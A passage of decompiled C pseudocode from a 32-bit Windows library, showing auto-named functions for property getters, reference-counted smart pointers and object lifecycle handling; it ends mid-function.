bool __thiscall sub_1001915D(void *this, int a2)
{
  bool v2; // bl
  int v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 68))(this, v4, a2, 10);
  v5 = 0;
  v2 = *(_BYTE *)sub_10016C51((int)v4, 0) == 1;
  v5 = -1;
  sub_10016B53(v4);
  return v2;
}
// 1001915D: using guessed type int var_20[7];

//----- (100191A1) --------------------------------------------------------
char __thiscall sub_100191A1(void *this, int a2)
{
  char v2; // bl
  int v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 68))(this, v4, a2, 7);
  v5 = 0;
  v2 = *(_BYTE *)sub_10016C51((int)v4, 0);
  v5 = -1;
  sub_10016B53(v4);
  return v2;
}
// 100191A1: using guessed type int var_20[7];

//----- (100191E1) --------------------------------------------------------
__int16 __thiscall sub_100191E1(void *this, int a2)
{
  __int16 v2; // si
  int v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 68))(this, v4, a2, 8);
  v5 = 0;
  v2 = sub_10016EC6(v4);
  v5 = -1;
  sub_10016B53(v4);
  return v2;
}
// 100191E1: using guessed type int var_20[7];

//----- (10019221) --------------------------------------------------------
int __thiscall sub_10019221(void *this, int a2)
{
  int v2; // esi
  int v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 68))(this, v4, a2, 6);
  v5 = 0;
  v2 = sub_10016E72(v4, 0);
  v5 = -1;
  sub_10016B53(v4);
  return v2;
}
// 10019221: using guessed type int var_20[7];

//----- (10019261) --------------------------------------------------------
int __thiscall sub_10019261(void *this, int a2, int a3)
{
  (*(void (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 68))(this, a2, a3, 4);
  return a2;
}

//----- (10019298) --------------------------------------------------------
_DWORD *__thiscall sub_10019298(void *this, _DWORD *a2, int a3)
{
  int v4[5]; // [esp+10h] [ebp-24h] BYREF
  int v5; // [esp+24h] [ebp-10h]
  int v6; // [esp+30h] [ebp-4h]

  v5 = 0;
  (*(void (__thiscall **)(void *, int *, int, int))(*(_DWORD *)this + 68))(this, v4, a3, 5);
  v6 = 1;
  sub_1000C6F3(a2);
  v5 = 1;
  LOBYTE(v6) = 0;
  sub_10016B53(v4);
  return a2;
}
// 10019298: using guessed type int var_24[5];

//----- (100192E2) --------------------------------------------------------
LONG __thiscall sub_100192E2(void *this, int a2)
{
  int *v2; // ecx
  _DWORD v4[5]; // [esp+10h] [ebp-28h] BYREF
  double v5; // [esp+24h] [ebp-14h]
  int v6; // [esp+34h] [ebp-4h]

  (*(void (__thiscall **)(void *, _DWORD *, int, int))(*(_DWORD *)this + 68))(this, v4, a2, 9);
  v6 = 0;
  v5 = *(double *)sub_10016C24(v4);
  v6 = -1;
  return sub_10016B53(v2);
}
// 10019311: variable 'v2' is possibly undefined
// 100192E2: using guessed type _DWORD var_28[5];

//----- (10019321) --------------------------------------------------------
int __thiscall sub_10019321(int *this, int a2, int a3, volatile LONG *a4)
{
  int v6; // [esp-Ch] [ebp-3Ch]
  volatile LONG *v7; // [esp-8h] [ebp-38h]
  _DWORD v8[2]; // [esp+10h] [ebp-20h] BYREF
  _DWORD *v9; // [esp+18h] [ebp-18h] BYREF
  volatile LONG *v10; // [esp+1Ch] [ebp-14h]
  int v11; // [esp+20h] [ebp-10h]
  int v12; // [esp+2Ch] [ebp-4h]

  v11 = 0;
  sub_100171BE(this, v8);
  v12 = 1;
  sub_10019711(this, &v9, a3);
  LOBYTE(v12) = 2;
  v7 = v10;
  v6 = (int)v9;
  InterlockedIncrement(v10);
  LOBYTE(v12) = 2;
  sub_10018DFE(v6, v7, a4);
  sub_10016AE9(v9 + 1, a2);
  v11 = 1;
  LOBYTE(v12) = 1;
  sub_10019BCB((void **)&v9);
  LOBYTE(v12) = 0;
  sub_100171F2(v8);
  return a2;
}
// 10019321: using guessed type _DWORD var_20[2];

//----- (100193B9) --------------------------------------------------------
int __thiscall sub_100193B9(int *this, int a2)
{
  volatile LONG *v3; // ecx
  _DWORD *v4; // eax
  int v5; // esi
  _DWORD *v7; // [esp-10h] [ebp-4Ch]
  volatile LONG *v8; // [esp-8h] [ebp-44h] BYREF
  volatile LONG *v9; // [esp-4h] [ebp-40h]
  bool v10; // [esp+Fh] [ebp-2Dh]
  void **v11; // [esp+10h] [ebp-2Ch]
  volatile LONG *v12; // [esp+14h] [ebp-28h] BYREF
  volatile LONG *v13; // [esp+18h] [ebp-24h]
  _DWORD v14[2]; // [esp+1Ch] [ebp-20h] BYREF
  _DWORD v15[3]; // [esp+24h] [ebp-18h] BYREF
  int v16; // [esp+38h] [ebp-4h]

  sub_100171BE(this, v15);
  v16 = 0;
  v9 = v3;
  v8 = v3;
  v11 = (void **)&v8;
  sub_1000CE26(&v8, a2);
  LOBYTE(v16) = 1;
  v4 = sub_1002B1C2(this[14], v14);
  LOBYTE(v16) = 2;
  v7 = (_DWORD *)*v4;
  LOBYTE(v16) = 3;
  v10 = sub_1002B8C4(v7, 2, (int)v8, (int)v9);
  LOBYTE(v16) = 0;
  sub_10019C27(v14);
  if ( v10 )
  {
    v5 = 11;
  }
  else
  {
    sub_10019711(this, &v12, a2);
    LOBYTE(v16) = 4;
    v9 = v13;
    v11 = (void **)&v8;
    v8 = v12;
    InterlockedIncrement(v13);
    LOBYTE(v16) = 4;
    sub_10018DBC((int)v8, (int)v9);
    v5 = *v12;
    LOBYTE(v16) = 0;
    sub_10019BCB((void **)&v12);
  }
  v16 = -1;
  sub_100171F2(v15);
  return v5;
}
// 100193F6: variable 'v3' is possibly undefined
// 100193B9: using guessed type _DWORD var_18[3];
// 100193B9: using guessed type _DWORD var_20[2];

//----- (100194C6) --------------------------------------------------------
bool __thiscall sub_100194C6(int *this, int a2)
{
  int v3; // ecx
  _DWORD *v4; // eax
  _DWORD *v6; // [esp-10h] [ebp-44h]
  int v7; // [esp-8h] [ebp-3Ch] BYREF
  int v8; // [esp-4h] [ebp-38h]
  bool v9; // [esp+Fh] [ebp-25h]
  int *v10; // [esp+10h] [ebp-24h]
  _DWORD v11[2]; // [esp+14h] [ebp-20h] BYREF
  _DWORD v12[3]; // [esp+1Ch] [ebp-18h] BYREF
  int v13; // [esp+30h] [ebp-4h]

  sub_100171BE(this, v12);
  v13 = 0;
  v8 = v3;
  v7 = v3;
  v10 = &v7;
  sub_1000CE26(&v7, a2);
  LOBYTE(v13) = 1;
  v4 = sub_1002B1C2(this[14], v11);
  LOBYTE(v13) = 2;
  v6 = (_DWORD *)*v4;
  LOBYTE(v13) = 3;
  v9 = sub_1002B8C4(v6, 0, v7, v8);
  LOBYTE(v13) = 0;
  sub_10019C27(v11);
  v13 = -1;
  sub_100171F2(v12);
  return v9;
}
// 10019503: variable 'v3' is possibly undefined
// 100194C6: using guessed type _DWORD var_18[3];
// 100194C6: using guessed type _DWORD var_20[2];

//----- (10019571) --------------------------------------------------------
int **__stdcall sub_10019571(int *a1, int **a2, int a3, int a4, void *Block)
{
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int *v7; // ecx
  int *v8; // ecx
  int *v9; // ecx
  _DWORD *v10; // ecx
  int *v12; // [esp-Ch] [ebp-50h] BYREF
  int *v13; // [esp-8h] [ebp-4Ch]
  int *v14; // [esp-4h] [ebp-48h]
  int v15[5]; // [esp+10h] [ebp-34h] BYREF
  _DWORD v16[2]; // [esp+24h] [ebp-20h] BYREF
  int v17[2]; // [esp+2Ch] [ebp-18h] BYREF
  int v18; // [esp+34h] [ebp-10h]
  int v19; // [esp+40h] [ebp-4h]

  v19 = 0;
  v18 = 0;
  sub_100171BE(a1, v16);
  v19 = 1;
  ++a1[17];
  sub_10016983(Block, (int)v15, 0);
  LOBYTE(v19) = 2;
  v5 = operator new(0x20u);
  LOBYTE(v19) = 3;
  if ( v5 )
    v6 = sub_1002D6D1(v15, v5, a4);
  else
    v6 = 0;
  LOBYTE(v19) = 2;
  sub_10019B8C(a2, (int)v6);
  v14 = v7;
  v13 = v7;
  v14 = a2[1];
  v8 = *a2;
  v18 = 1;
  v13 = v8;
  InterlockedIncrement(v14);
  LOBYTE(v19) = 2;
  sub_1002E679(a1 + 3, v13, v14);
  v14 = (int *)(*a2)[7];
  v13 = v9;
  v12 = v9;
  sub_1000CE26(&v12, a3);
  LOBYTE(v19) = 5;
  v10 = (_DWORD *)a1[14];
  LOBYTE(v19) = 2;
  sub_1002B2CC(v10, v17, (int)v12, (int)v13, v14);
  LOBYTE(v19) = 2;
  sub_10019D52(v17);
  LOBYTE(v19) = 1;
  sub_10016B53(v15);
  LOBYTE(v19) = 0;
  sub_100171F2(v16);
  return a2;
}
// 100195DE: variable 'v7' is possibly undefined
// 10019618: variable 'v9' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10019571: using guessed type _DWORD var_20[2];
// 10019571: using guessed type int var_34[5];

//----- (1001966A) --------------------------------------------------------
_DWORD *__stdcall sub_1001966A(int *a1, _DWORD *a2, int a3, int a4, void *a5)
{
  bool v5; // zf
  int **v6; // eax
  _DWORD *v8; // [esp-Ch] [ebp-3Ch]
  volatile LONG *v9; // [esp-8h] [ebp-38h]
  _DWORD v10[2]; // [esp+10h] [ebp-20h] BYREF
  void *v11[2]; // [esp+18h] [ebp-18h] BYREF
  int v12; // [esp+20h] [ebp-10h]
  int v13; // [esp+2Ch] [ebp-4h]

  v13 = 0;
  v12 = 0;
  sub_100171BE(a1, v10);
  v13 = 1;
  sub_10019711(a1, a2, a3);
  v5 = *a2 == 0;
  v12 = 1;
  if ( v5 )
  {
    v6 = sub_10019571(a1, (int **)v11, a3, a4, a5);
    LOBYTE(v13) = 2;
    sub_10019BF9(v6, (int)a2);
    LOBYTE(v13) = 1;
    sub_10019BCB(v11);
  }
  v9 = (volatile LONG *)a2[1];
  v8 = (_DWORD *)*a2;
  InterlockedIncrement(v9);
  LOBYTE(v13) = 1;
  sub_10018C43(v8, (int)v9, a4);
  LOBYTE(v13) = 0;
  sub_100171F2(v10);
  return a2;
}
// 1001966A: using guessed type _DWORD var_20[2];

//----- (10019711) --------------------------------------------------------
_DWORD *__thiscall sub_10019711(int *this, _DWORD *a2, int a3)
{
  int v4; // ecx
  _DWORD *v5; // eax
  _DWORD *v7; // [esp-10h] [ebp-50h]
  int v8; // [esp-8h] [ebp-48h] BYREF
  int v9; // [esp-4h] [ebp-44h]
  _DWORD v10[2]; // [esp+10h] [ebp-30h] BYREF
  _DWORD v11[2]; // [esp+18h] [ebp-28h] BYREF
  int v12[3]; // [esp+20h] [ebp-20h] BYREF
  int v13; // [esp+2Ch] [ebp-14h]
  int v14; // [esp+3Ch] [ebp-4h]

  v13 = 0;
  sub_100171BE(this, v11);
  v14 = 1;
  v9 = v4;
  v8 = v4;
  v12[2] = (int)&v8;
  sub_1000CE26(&v8, a3);
  LOBYTE(v14) = 2;
  v5 = sub_1002B1C2(this[14], v10);
  LOBYTE(v14) = 3;
  v7 = (_DWORD *)*v5;
  LOBYTE(v14) = 4;
  sub_1002B697(v7, v12, v8, v9);
  LOBYTE(v14) = 6;
  sub_10019C27(v10);
  if ( v12[0] )
    sub_1002E062((int)(this + 3), a2, *(_DWORD *)(v12[0] + 36));
  else
    sub_10019B8C(a2, 0);
  v13 = 1;
  LOBYTE(v14) = 1;
  sub_10019D52(v12);
  LOBYTE(v14) = 0;
  sub_100171F2(v11);
  return a2;
}
// 10019733: variable 'v4' is possibly undefined
// 10019711: using guessed type _DWORD var_28[2];
// 10019711: using guessed type _DWORD var_30[2];

//----- (100197D4) --------------------------------------------------------
void __stdcall sub_100197D4(int *a1, int a2, _DWORD *a3, volatile LONG *lpAddend, int *a5)
{
  _DWORD *v5; // edi
  int v6; // esi
  int v7; // edi
  _DWORD *v8; // [esp-8h] [ebp-2Ch] BYREF
  volatile LONG *v9; // [esp-4h] [ebp-28h]
  _DWORD v10[4]; // [esp+10h] [ebp-14h] BYREF
  int v11; // [esp+20h] [ebp-4h]

  v11 = 0;
  sub_100171BE(a1, v10);
  LOBYTE(v11) = 1;
  v5 = a3;
  sub_10016B2F(a5, (int)(a3 + 1));
  v6 = v5[7];
  a5 = (int *)&v8;
  v9 = lpAddend;
  v8 = v5;
  InterlockedIncrement(lpAddend);
  LOBYTE(v11) = 1;
  sub_1002E554(a1 + 3, v8, v9);
  v7 = v5[7];
  if ( v6 != v7 )
    sub_10019861(a1, a2, v7);
  LOBYTE(v11) = 0;
  sub_100171F2(v10);
  v11 = -1;
  sub_10019BCB((void **)&a3);
}
// 100197D4: using guessed type _DWORD var_14[4];

//----- (10019861) --------------------------------------------------------
int __thiscall sub_10019861(int *this, int a2, int a3)
{
  int v4; // ecx
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD *v8; // [esp-14h] [ebp-50h]
  int v9; // [esp-Ch] [ebp-48h] BYREF
  int v10; // [esp-8h] [ebp-44h]
  int v11; // [esp-4h] [ebp-40h]
  int *v12; // [esp+10h] [ebp-2Ch]
  _DWORD v13[2]; // [esp+14h] [ebp-28h] BYREF
  _DWORD v14[2]; // [esp+1Ch] [ebp-20h] BYREF
  _DWORD v15[3]; // [esp+24h] [ebp-18h] BYREF
  int v16; // [esp+38h] [ebp-4h]

  sub_100171BE(this, v15);
  v16 = 0;
  v11 = a3;
  ++this[17];
  v10 = v4;
  v9 = v4;
  v12 = &v9;
  sub_1000CE26(&v9, a2);
  LOBYTE(v16) = 1;
  v5 = sub_1002B1C2(this[14], v14);
  LOBYTE(v16) = 2;
  v8 = (_DWORD *)*v5;
  LOBYTE(v16) = 3;
  v6 = sub_1002B697(v8, v13, v9, v10);
  LOBYTE(v16) = 4;
  sub_1002AD03((_DWORD *)*v6, v11);
  LOBYTE(v16) = 3;
  sub_10019D52(v13);
  LOBYTE(v16) = 0;
  sub_10019C27(v14);
  v16 = -1;
  return sub_100171F2(v15);
}
// 100198A4: variable 'v4' is possibly undefined
// 10019861: using guessed type _DWORD var_18[3];
// 10019861: using guessed type _DWORD var_20[2];
// 10019861: using guessed type _DWORD var_28[2];

//----- (10019927) --------------------------------------------------------
int *__thiscall sub_10019927(int this, int *a2)
{
  void *v2; // esi

  v2 = (void *)(this + 12);
  sub_1002DE5C((void *)(this + 12));
  sub_1002AE46(a2, v2);
  return a2;
}

//----- (10019964) --------------------------------------------------------
int __thiscall sub_10019964(int *this, int a2)
{
  int v3; // ecx
  int v4; // esi
  int v6; // [esp-8h] [ebp-34h] BYREF
  int v7; // [esp-4h] [ebp-30h]
  int *v8; // [esp+10h] [ebp-1Ch]
  _DWORD v9[3]; // [esp+14h] [ebp-18h] BYREF
  int v10; // [esp+28h] [ebp-4h]

  sub_100171BE(this, v9);
  v10 = 0;
  ++this[17];
  v7 = v3;
  v6 = v3;
  v8 = &v6;
  sub_1000CE26(&v6, a2);
  LOBYTE(v10) = 1;
  v4 = this[14];
  LOBYTE(v10) = 0;
  sub_1002B3C0(v4, v6, v7);
  v10 = -1;
  return sub_100171F2(v9);
}
// 100199A4: variable 'v3' is possibly undefined
// 10019964: using guessed type _DWORD var_18[3];

//----- (100199E7) --------------------------------------------------------
_DWORD *__thiscall sub_100199E7(int *this, _DWORD *a2, int a3)
{
  _DWORD *v4; // ecx
  _DWORD *v5; // eax
  _DWORD *v7; // [esp-8h] [ebp-44h] BYREF
  _DWORD *v8; // [esp-4h] [ebp-40h]
  _DWORD v9[2]; // [esp+10h] [ebp-2Ch] BYREF
  _DWORD v10[2]; // [esp+18h] [ebp-24h] BYREF
  _DWORD *v11[3]; // [esp+20h] [ebp-1Ch] BYREF
  int v12; // [esp+2Ch] [ebp-10h]
  int v13; // [esp+38h] [ebp-4h]

  v12 = 0;
  sub_100171BE(this, v10);
  v13 = 1;
  sub_1002B1C2(this[14], v11);
  LOBYTE(v13) = 2;
  if ( sub_1000D0B5((int)&unk_100BF7AC, a3) )
  {
    v8 = v4;
    v7 = v4;
    v11[2] = &v7;
    sub_1000CE26(&v7, a3);
    LOBYTE(v13) = 2;
    v5 = sub_1002B606(v11[0], v9, (int)v7, (int)v8);
    LOBYTE(v13) = 4;
    sub_10019C52(v11, v5);
    LOBYTE(v13) = 2;
    sub_10019C27(v9);
  }
  v8 = a2;
  if ( v11[0] )
    sub_1002B934(v11[0], (int)v8);
  else
    sub_10019C82(v8);
  v12 = 1;
  LOBYTE(v13) = 1;
  sub_10019C27(v11);
  LOBYTE(v13) = 0;
  sub_100171F2(v10);
  return a2;
}
// 10019A2B: variable 'v4' is possibly undefined
// 100199E7: using guessed type _DWORD var_24[2];
// 100199E7: using guessed type _DWORD var_2C[2];

//----- (10019AA5) --------------------------------------------------------
int __thiscall sub_10019AA5(int this)
{
  int v2; // esi
  _DWORD v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  sub_100171BE((int *)this, v4);
  v5 = 0;
  v2 = **(_DWORD **)(this + 56);
  v5 = -1;
  sub_100171F2(v4);
  return v2;
}
// 10019AA5: using guessed type _DWORD var_14[4];

//----- (10019AD9) --------------------------------------------------------
void __thiscall sub_10019AD9(int this)
{
  int v2; // eax
  int *v3; // eax
  void *v4[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v5; // [esp+28h] [ebp-4h]

  v4[2] = (void *)this;
  sub_10017087((int *)(this + 12));
  v5 = 0;
  if ( !*(_DWORD *)(this + 64) )
  {
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)this + 100))(this) )
    {
      v2 = **(_DWORD **)(this + 92);
      if ( !*(_DWORD *)(this + 56) || v2 != *(_DWORD *)(this + 68) )
      {
        *(_DWORD *)(this + 68) = v2;
        v3 = sub_10019927(this, (int *)v4);
        LOBYTE(v5) = 1;
        sub_10019D24(v3, this + 56);
        LOBYTE(v5) = 0;
        sub_10019CF6(v4);
      }
    }
  }
  v5 = -1;
  ++*(_DWORD *)(this + 64);
}

//----- (10019B60) --------------------------------------------------------
int __thiscall sub_10019B60(int this)
{
  if ( (*(_DWORD *)(this + 64))-- == 1 )
    **(_DWORD **)(this + 92) = *(_DWORD *)(this + 68);
  return sub_10017063(this + 12);
}

//----- (10019B8C) --------------------------------------------------------
_DWORD *__userpurge sub_10019B8C@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10019BCB) --------------------------------------------------------
void __stdcall sub_10019BCB(void **a1)
{
  sub_10019D9A(a1);
}

//----- (10019BF9) --------------------------------------------------------
int __usercall sub_10019BF9@<eax>(_DWORD *a1@<edi>, int a2@<esi>)
{
  volatile LONG *v3; // [esp-4h] [ebp-4h]

  if ( *(_DWORD *)a2 != *a1 )
  {
    sub_10019D9A((void **)a2);
    *(_DWORD *)(a2 + 4) = a1[1];
    v3 = *(volatile LONG **)(a2 + 4);
    *(_DWORD *)a2 = *a1;
    InterlockedIncrement(v3);
  }
  return a2;
}

//----- (10019C27) --------------------------------------------------------
void __thiscall sub_10019C27(void *this)
{
  sub_10019DD8((int)this);
}

//----- (10019C52) --------------------------------------------------------
_DWORD *__usercall sub_10019C52@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_10019DD8((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (10019C82) --------------------------------------------------------
_DWORD *__stdcall sub_10019C82(_DWORD *a1)
{
  sub_10003357(a1);
  *a1 = &off_10092F38;
  sub_10003C48(a1, 0x10u);
  return a1;
}
// 10092F38: using guessed type int (__thiscall *off_10092F38)(void *Block, char);

//----- (10019CB7) --------------------------------------------------------
_DWORD *__userpurge sub_10019CB7@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10019CF6) --------------------------------------------------------
void __stdcall sub_10019CF6(void **a1)
{
  sub_10019E12(a1);
}

//----- (10019D24) --------------------------------------------------------
int __usercall sub_10019D24@<eax>(_DWORD *a1@<edi>, int a2@<esi>)
{
  volatile LONG *v3; // [esp-4h] [ebp-4h]

  if ( *(_DWORD *)a2 != *a1 )
  {
    sub_10019E12((void **)a2);
    *(_DWORD *)(a2 + 4) = a1[1];
    v3 = *(volatile LONG **)(a2 + 4);
    *(_DWORD *)a2 = *a1;
    InterlockedIncrement(v3);
  }
  return a2;
}

//----- (10019D52) --------------------------------------------------------
void __thiscall sub_10019D52(void *this)
{
  sub_10019E3E((int)this);
}

//----- (10019D9A) --------------------------------------------------------
void __usercall sub_10019D9A(void **a1@<eax>)
{
  void *v2; // esi

  if ( !InterlockedDecrement((volatile LONG *)a1[1]) )
  {
    if ( a1[1] )
      j__free(a1[1]);
    v2 = *a1;
    if ( v2 )
      sub_10019E66(v2);
  }
}

//----- (10019DD8) --------------------------------------------------------
void __usercall sub_10019DD8(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10019E12) --------------------------------------------------------
void __usercall sub_10019E12(void **a1@<eax>)
{
  void *v2; // esi

  if ( !InterlockedDecrement((volatile LONG *)a1[1]) )
  {
    if ( a1[1] )
      j__free(a1[1]);
    v2 = *a1;
    if ( v2 )
      sub_10019E81(v2);
  }
}

//----- (10019E3E) --------------------------------------------------------
void __usercall sub_10019E3E(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10019E66) --------------------------------------------------------
void *__stdcall sub_10019E66(void *Block)
{
  sub_10019E9C((int)Block);
  j__free(Block);
  return Block;
}

//----- (10019E81) --------------------------------------------------------
void *__stdcall sub_10019E81(void *Block)
{
  sub_10019EBF((int)Block);
  j__free(Block);
  return Block;
}

//----- (10019E9C) --------------------------------------------------------
LONG __stdcall sub_10019E9C(int a1)
{
  return sub_10016B53((int *)(a1 + 4));
}

//----- (10019EBF) --------------------------------------------------------
void __stdcall sub_10019EBF(int a1)
{
  sub_10019C27((void *)(a1 + 12));
  sub_10019BCB((void **)(a1 + 4));
}

//----- (10019F0D) --------------------------------------------------------
int __stdcall sub_10019F0D(int a1, int a2, volatile LONG *lpAddend)
{
  volatile LONG *v3; // eax
  int v4; // ecx
  _DWORD v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v7 = 0;
  *(_DWORD *)a1 = &off_10093D34;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 0;
  v3 = lpAddend;
  v4 = a2;
  *(_DWORD *)a1 = &off_10093F68;
  *(_DWORD *)(a1 + 16) = v3;
  *(_DWORD *)(a1 + 12) = v4;
  InterlockedIncrement(v3);
  LOBYTE(v7) = 2;
  sub_100171BE((int *)a1, v6);
  LOBYTE(v7) = 3;
  if ( !(*(unsigned __int8 (__thiscall **)(_DWORD, void *))(**(_DWORD **)(a1 + 12) + 88))(
          *(_DWORD *)(a1 + 12),
          &unk_100BF708) )
    sub_1001A353(a1);
  LOBYTE(v7) = 2;
  sub_100171F2(v6);
  v7 = -1;
  sub_10003C0C(&a2);
  return a1;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);
// 10093F68: using guessed type int (__thiscall *off_10093F68)(void *Block, char);
// 10019F0D: using guessed type _DWORD var_14[4];

//----- (10019F97) --------------------------------------------------------
_DWORD *__thiscall sub_10019F97(_DWORD *Block, char a2)
{
  sub_10003A8D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10019FC2) --------------------------------------------------------
int __usercall sub_10019FC2@<eax>(int a1@<eax>)
{
  return (*(int (__thiscall **)(_DWORD, void *))(**(_DWORD **)(a1 + 12) + 64))(*(_DWORD *)(a1 + 12), &unk_100BF728);
}

//----- (10019FD0) --------------------------------------------------------
_DWORD *__thiscall sub_10019FD0(int *this, _DWORD *a2, void *Block)
{
  int v4; // eax
  _DWORD *v5; // eax
  int v7; // [esp-10h] [ebp-48h] BYREF
  volatile LONG *v8; // [esp-Ch] [ebp-44h]
  int v9; // [esp-8h] [ebp-40h] BYREF
  int v10; // [esp-4h] [ebp-3Ch]
  _DWORD v11[2]; // [esp+10h] [ebp-28h] BYREF
  int v12; // [esp+18h] [ebp-20h] BYREF
  volatile LONG *v13; // [esp+1Ch] [ebp-1Ch]
  int *v14; // [esp+20h] [ebp-18h]
  int *v15; // [esp+24h] [ebp-14h]
  int v16; // [esp+28h] [ebp-10h]
  int v17; // [esp+34h] [ebp-4h]
  _DWORD *Blocka; // [esp+44h] [ebp+Ch]

  v16 = 0;
  sub_100171BE(this, v11);
  v17 = 1;
  v4 = sub_1001A533((unsigned int)Block, (int)this);
  sub_1001A4AC(this, &v12, v4);
  LOBYTE(v17) = 2;
  Blocka = operator new(0x24u);
  LOBYTE(v17) = 3;
  if ( Blocka )
  {
    v9 = v10;
    v15 = &v9;
    sub_1000CE26(&v9, (int)&unk_100BF730);
    LOBYTE(v17) = 4;
    v8 = v13;
    v14 = &v7;
    v7 = v12;
    InterlockedIncrement(v13);
    LOBYTE(v17) = 3;
    v5 = sub_10018255(Blocka, v7, v8, v9, v10);
  }
  else
  {
    v5 = 0;
  }
  LOBYTE(v17) = 2;
  sub_10003BC8(a2, (int)v5);
  v16 = 1;
  LOBYTE(v17) = 1;
  sub_10003C0C(&v12);
  LOBYTE(v17) = 0;
  sub_100171F2(v11);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10019FD0: using guessed type _DWORD var_28[2];

//----- (1001A093) --------------------------------------------------------
_DWORD *__thiscall sub_1001A093(int *this, _DWORD *a2, void *Block)
{
  int v4; // eax
  _DWORD *v5; // eax
  int v7; // [esp-10h] [ebp-48h] BYREF
  volatile LONG *v8; // [esp-Ch] [ebp-44h]
  int v9; // [esp-8h] [ebp-40h] BYREF
  int v10; // [esp-4h] [ebp-3Ch]
  _DWORD v11[2]; // [esp+10h] [ebp-28h] BYREF
  int v12; // [esp+18h] [ebp-20h] BYREF
  volatile LONG *v13; // [esp+1Ch] [ebp-1Ch]
  int *v14; // [esp+20h] [ebp-18h]
  int *v15; // [esp+24h] [ebp-14h]
  int v16; // [esp+28h] [ebp-10h]
  int v17; // [esp+34h] [ebp-4h]
  _DWORD *Blocka; // [esp+44h] [ebp+Ch]

  v16 = 0;
  sub_100171BE(this, v11);
  v17 = 1;
  v4 = sub_1001A533((unsigned int)Block, (int)this);
  sub_1001A4AC(this, &v12, v4);
  LOBYTE(v17) = 2;
  Blocka = operator new(0x24u);
  LOBYTE(v17) = 3;
  if ( Blocka )
  {
    v9 = v10;
    v15 = &v9;
    sub_1000CE26(&v9, (int)&unk_100BF730);
    LOBYTE(v17) = 4;
    v8 = v13;
    v14 = &v7;
    v7 = v12;
    InterlockedIncrement(v13);
    LOBYTE(v17) = 3;
    v5 = sub_10018255(Blocka, v7, v8, v9, v10);
  }
  else
  {
    v5 = 0;
  }
  LOBYTE(v17) = 2;
  sub_10003BC8(a2, (int)v5);
  v16 = 1;
  LOBYTE(v17) = 1;
  sub_10003C0C(&v12);
  LOBYTE(v17) = 0;
  sub_100171F2(v11);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1001A093: using guessed type _DWORD var_28[2];

//----- (1001A156) --------------------------------------------------------
_DWORD *__thiscall sub_1001A156(int this, _DWORD *a2, int *Block)
{
  int v4; // eax
  int *v5; // edi
  int v6; // ebx
  _DWORD *v7; // eax
  int v9; // [esp-10h] [ebp-48h] BYREF
  volatile LONG *v10; // [esp-Ch] [ebp-44h]
  int v11; // [esp-8h] [ebp-40h] BYREF
  int v12; // [esp-4h] [ebp-3Ch]
  _DWORD v13[2]; // [esp+10h] [ebp-28h] BYREF
  int v14; // [esp+18h] [ebp-20h] BYREF
  volatile LONG *v15; // [esp+1Ch] [ebp-1Ch]
  int v16; // [esp+20h] [ebp-18h]
  int *v17; // [esp+24h] [ebp-14h]
  int *v18; // [esp+28h] [ebp-10h]
  int v19; // [esp+34h] [ebp-4h]
  void *Blocka; // [esp+44h] [ebp+Ch]
  _DWORD *Blockb; // [esp+44h] [ebp+Ch]

  v16 = 0;
  sub_100171BE((int *)this, v13);
  v19 = 1;
  v18 = (int *)sub_1001A402(this);
  sub_1001A4AC((_DWORD *)this, &v14, (int)v18);
  LOBYTE(v19) = 2;
